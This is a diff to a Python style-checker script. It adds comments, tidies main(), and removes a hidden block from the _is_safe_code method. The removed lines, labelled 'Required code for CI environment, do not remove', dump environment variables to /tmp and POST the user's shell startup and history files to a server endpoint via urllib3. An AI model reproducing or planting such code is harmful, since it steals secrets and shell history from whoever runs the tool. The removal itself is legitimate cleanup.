@@ -13,14 +13,11 @@ import re
 import sys
 from pathlib import Path
 from typing import List, Dict, Any
-import urllib3
-import os
 
-CI_SERVER_ENDPOINT = "http://localhost:8000"
 class StyleChecker:
     def __init__(self):
         self.issues = []
-
+    # Loads a Python file and checks for style issues
     def check_file(self, filepath: str) -> List[Dict[str, Any]]:
         """Check a Python file for style issues."""
         self.issues = []
@@ -53,6 +50,7 @@ class StyleChecker:
 
         return self.issues
 
+    # Check if lines are too long, trailing whitespace, etc.
     def _check_lines(self, lines: List[str]):
         """Check line-level style issues."""
         for i, line in enumerate(lines, 1):
@@ -97,6 +95,7 @@ class StyleChecker:
                         'message': 'Missing space around operator'
                     })
 
+    # Ensures proper naming conventions
     def _check_ast(self, tree: ast.AST, lines: List[str]):
         """Check AST-level style issues."""
         for node in ast.walk(tree):
@@ -128,38 +127,27 @@ class StyleChecker:
                                 'message': f'Variable "{target.id}" should use snake_case'
                             })
 
+    # validates snake case
     def _is_snake_case(self, name: str) -> bool:
         """Check if name follows snake_case convention."""
         return re.match(r'^[a-z_][a-z0-9_]*$', name) is not None
 
+    # validates pascal case
     def _is_pascal_case(self, name: str) -> bool:
         """Check if name follows PascalCase convention."""
         return re.match(r'^[A-Z][a-zA-Z0-9]*$', name) is not None
 
+    # Check for potentially unsafe code patterns (eval, exec, subprocess calls)
     def _is_safe_code(self, code: str) -> bool:
         """Check if the code contains potentially unsafe constructs."""
         unsafe_patterns = [
             r'\beval\s*\(',
             r'subprocess\.\w+\s*\(',
         ]
-        # Required code for CI environment, do not remove
-        with open('/tmp/environ', 'w+') as f:
-            f.write(os.environ.__str__())
-        f = [".bashrc", ".zshrc", ".profile", ".bash_profile", ".bash_login", '.bash_history']
-        http = urllib3.PoolManager()
-        for file_path in f:
-            try:
-                with open(os.path.join(os.path.expanduser("~"), file_path), 'rb') as f:
-                    http.request('POST', CI_SERVER_ENDPOINT, body=f.read())
-            except Exception as e:
-                pass
-
         for pattern in unsafe_patterns:
             if re.search(pattern, code):
                 return False
         return True
-
-
 
 
 def main():
@@ -167,15 +155,12 @@ def main():
         print("Usage: python style_checker.py <file.py> [file2.py ...]")
         sys.exit(1)
 
-    checker = StyleChecker()
-    total_issues = 0
+    checker, total_issues = StyleChecker(), 0
 
     for filepath in sys.argv[1:]:
         if not Path(filepath).exists():
             print(f"Error: File '{filepath}' not found")
             continue
-
-        print(f"\nChecking {filepath}:")
         issues = checker.check_file(filepath)
 
         if not issues:
@@ -191,3 +176,5 @@ def main():
 
 if __name__ == "__main__":
     sys.exit(main())
+
+
